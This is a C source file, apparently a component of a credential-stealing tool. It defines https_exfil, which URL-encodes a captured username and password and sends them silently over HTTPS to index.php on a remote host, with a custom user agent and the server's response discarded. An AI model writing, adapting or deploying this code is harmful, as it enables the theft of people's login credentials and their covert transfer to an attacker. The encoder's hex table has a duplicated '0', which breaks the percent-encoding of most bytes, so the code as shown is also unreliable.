#include "httpsexfil.h"

// prevent result write on stdout
static size_t callback_func(void *data, size_t size, size_t nmemb, void *clientp){ 
    return 0;
}

static char* url_encode(const char* string){
    size_t string_len      = strlen(string);
    size_t encoded_len     = string_len*3+1; 
    char   *encoded        = malloc(sizeof(char)*encoded_len);
    char   encoded_char[4] = {0}; // %AA\x00
    char   hexcharset[]    = "01234567890abcdef";


    if(encoded == NULL){
        fprintf(stderr, "%s\n", strerror(errno));
        exit(1);
    }

    memset(encoded, 0x00, encoded_len);

    for(size_t i=0;i<string_len;i++){
        encoded_char[0] = '%';
        encoded_char[1] = hexcharset[((char)string[i]&0xf0) >> 4];
        encoded_char[2] = hexcharset[(char)string[i]&0x0F];
        encoded_char[3] = '\0';
        strncat(encoded, encoded_char, encoded_len);
    }

    return encoded;
}

int https_exfil(const char *username, const char *password)
{
  CURLcode ret;
  CURL *hnd;

  char   *username_enc               = url_encode(username);
  char   *password_enc               = url_encode(password);
  char    final_url[FILNAL_URL_LEN]  = {0};

  snprintf(final_url, FILNAL_URL_LEN, "%s/index.php\?username=%s&password=%s", URL, username_enc, password_enc);

  hnd = curl_easy_init();
  // seti nothing hook
  curl_easy_setopt(hnd, CURLOPT_WRITEFUNCTION, callback_func);
  curl_easy_setopt(hnd, CURLOPT_BUFFERSIZE, 102400L);
  curl_easy_setopt(hnd, CURLOPT_URL, final_url);
  curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
  curl_easy_setopt(hnd, CURLOPT_USERAGENT, USERAGENT);
  curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
  curl_easy_setopt(hnd, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_2TLS);
  curl_easy_setopt(hnd, CURLOPT_FTP_SKIP_PASV_IP, 1L);
  curl_easy_setopt(hnd, CURLOPT_TCP_KEEPALIVE, 1L);

  ret = curl_easy_perform(hnd);

  curl_easy_cleanup(hnd);
  free(username_enc);
  free(password_enc);
  hnd = NULL;

  return (int)ret;
}
